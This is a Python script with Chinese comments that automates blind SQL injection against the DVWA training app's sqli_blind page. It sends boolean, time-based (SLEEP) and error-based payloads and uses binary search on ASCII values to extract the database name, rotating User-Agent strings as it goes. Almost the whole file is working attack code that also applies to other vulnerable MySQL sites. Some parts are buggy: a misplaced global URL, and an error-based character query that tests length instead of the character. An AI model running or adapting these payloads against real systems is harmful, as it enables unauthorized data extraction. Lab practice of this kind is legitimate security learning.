from typing import final

import requests
import random
import time

# 研究源代码和网页界面
errorText = [
    "User ID is MISSING from the database.",
    "User ID exists in the database."
]



class BlindingDVWA:
    def __init__(self, base_url, operation_code, request_method):
        self.session = requests.session()
        self.base_url = base_url
        self.operation_code = operation_code
        self.request_method = request_method
        self.agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15"
        ]

    def get_random_agent(self):
        headers = {"User-Agent": random.choice(self.agents)}
        return headers

    def send_request(self, selected_payload):

        params = {
            "id": selected_payload,
            "Submit": "Submit"
        }

        full_url = f"{base_url}?id={selected_payload}&Submit=Submit#"

        try:
            if self.request_method == "GET":
                response = requests.get(full_url, headers=self.get_random_agent(), timeout=60)
            elif self.request_method == "POST":
                response = requests.post(self.base_url, data=params, headers=self.get_random_agent(), timeout=60)
            else:
                print("[!] unknown request method ")
                return None
        except requests.Timeout:
            print("[!] Request Timeout")
            return None

        return response


    def get_db_length(self):

        query = [
            # 布尔盲注，用于GET
            {
                "payload": lambda i: f"1' AND LENGTH(DATABASE()) = {i} %23",
                "check": lambda r: errorText[1] in r.text
            },
            # 时间盲注
            {
                "payload": lambda i: f"1' AND IF(LENGTH(DATABASE())={i}, SLEEP(6), 0) %23",
                "check": lambda r: r.elapsed.total_seconds()>=4
            },
            {
                "payload": lambda i: f"1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (LENGTH(database())={i}), 0x3a, FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) %23",
                "check": lambda r: r.status_code == 500
            }

        ]

        if self.operation_code not in [0, 1, 2]:
            print("[!] query code is wrong")
            return None

        selected_query = query[self.operation_code]

        for i in range(1, 21):  # 从 1 开始

            payload = selected_query["payload"](i)
            response = self.send_request(payload)

            if selected_query["check"](response):
                print(f"[*] DATABASE LENGTH: {i}")
                return i


    def bisect_with_name(self, index):

        if self.operation_code not in [0, 1, 2]:
            print("[!] query code is wrong")
            return None

        low, high = 32, 126
        query = [
            # 布尔盲注，用于GET
            {
                "payload": lambda mid: f"1' AND ascii(substr(DATABASE(), {index}, 1)) > {mid} %23",
                "check": lambda r: errorText[1] in r.text
            },
            # 时间盲注，用于GET和POST、POST的还没写
            {
                "payload": lambda mid: f"1' AND IF(ascii(substr(database(),{index},1))>{mid},SLEEP(6),0)# %23",
                "check": lambda r: r.elapsed.total_seconds() >= 4
            },
            {
                "payload": lambda mid: f"1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (LENGTH(database())={mid}), 0x3a, FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) %23",
                "check": lambda r: r.status_code == 500
            }

        ]

        selected_query = query[self.operation_code]

        while low <= high:
            mid = (low + high) // 2
            payload = selected_query["payload"](mid)
            response = self.send_request(payload)

            if selected_query["check"](response):
                low = mid + 1
            else:
                high = mid - 1

        final_char = chr(low)
        print(f"[*] FIND CHARACTER AT POSITION {index}: {final_char}")

        return final_char

    def get_db_name(self, length):

        res = []

        for i in range(1, length+1):
            res.append(self.bisect_with_name(i))

        db_name = "".join(res)

        if not length or length <= 0:
            print("[!] Invalid database length")
            return None

        print(f"[*] DATABASE NAME: {db_name}")

        return db_name



if __name__ == "__main__":
    base_url = "http://dvwa/vulnerabilities/sqli_blind/"
    b = BlindingDVWA(base_url, 0, "GET")
    l = b.get_db_length()
    db_name = b.get_db_name(l)





